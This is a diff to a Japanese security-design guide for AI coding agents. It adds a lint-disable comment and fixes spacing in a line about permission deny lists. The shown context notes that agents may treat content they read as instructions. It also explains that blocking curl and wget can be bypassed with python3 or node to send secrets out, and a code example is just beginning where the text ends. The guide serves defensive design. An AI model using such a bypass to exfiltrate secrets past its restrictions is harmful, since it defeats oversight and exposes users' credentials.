@@ -1,3 +1,5 @@
+<!-- textlint-disable @textlint-ja/ai-writing/ai-tech-writing-guideline -->
+
 # セキュリティ設計
 
 AIコーディングエージェントは通常のプログラムと異なり、読み込んだコンテンツが命令として解釈されるリスクがある。エージェントに渡す権限の範囲と、権限を強制するメカニズムの設計がセキュリティの核心である。
@@ -173,7 +175,7 @@ hooksスクリプトや`settings.json`が書き換えられると、すべての
 | [SOPS](https://github.com/getsops/sops) | YAML/JSON/ENV等を対象にage・PGP・AWS KMS等で暗号化する。Terraformとの親和性が高い |
 | [1Password CLI](https://developer.1password.com/docs/cli/) / [Bitwarden CLI](https://bitwarden.com/help/cli/) | シークレットをファイルに書かずCLIで実行時に注入する。`.env`ファイル自体を持たない設計が可能 |
 
-curl/wget を禁止しても迂回される: `curl`や`wget`をdenyしていても、`python3`や`node`が許可されていればHTTP通信で外部にシークレットを送信できる。
+curl/wgetを禁止しても迂回される: `curl`や`wget`をdenyしていても、`python3`や`node`が許可されていればHTTP通信で外部にシークレットを送信できる。
 
 ```python
 # curl/wget を禁止していても python3 が許可されていれば外部送信できる
